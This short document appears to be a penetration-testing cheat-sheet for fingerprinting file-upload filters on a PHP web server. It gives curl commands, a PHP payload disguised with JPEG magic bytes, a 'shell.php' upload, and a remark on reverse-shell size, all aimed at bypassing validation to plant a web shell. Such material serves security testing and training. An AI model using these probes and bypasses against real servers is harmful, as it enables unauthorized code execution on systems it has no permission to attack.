# filter enumeration. probe server defenses systematically.

## step 1: extension filter type

upload file with bad extension:
```bash
# test file
touch test.invalidext
curl -F "file=@test.invalidext" http://target/upload.php
```

**result:**
- blocked = server uses blacklist (blocks specific extensions)
- allowed = server uses whitelist (only allows specific extensions)

## step 2: magic number validation  

upload valid file, change magic bytes:
```bash
# create fake php-as-image
echo -ne '\xff\xd8\xff\xe0' > test.jpg
echo '<?php echo "test"; ?>' >> test.jpg
```

**result:**
- blocked = server checks file signatures
- allowed = server trusts extension/mime only

## step 3: mime type validation

change content-type header:
```bash
curl -F "file=@shell.php" \
     -H "Content-Type: application/x-php" \
     http://target/upload.php
```

**result:**
- blocked = server validates mime types
- allowed = server ignores content-type

## step 4: file size limits

test with increasingly large files:
```bash
# generate test files of different sizes
dd if=/dev/zero of=1kb.txt bs=1024 count=1
dd if=/dev/zero of=10kb.txt bs=1024 count=10
dd if=/dev/zero of=100kb.txt bs=1024 count=100
```

**result:**
- discover maximum upload size
- [!] standard php reverse shell = 5.4kb

## operational notes

- watch error messages - they reveal filter logic
- combine multiple bypass techniques based on discovered filters  
- document exact filter behavior for target system

# TODO: automate filter fingerprinting with script

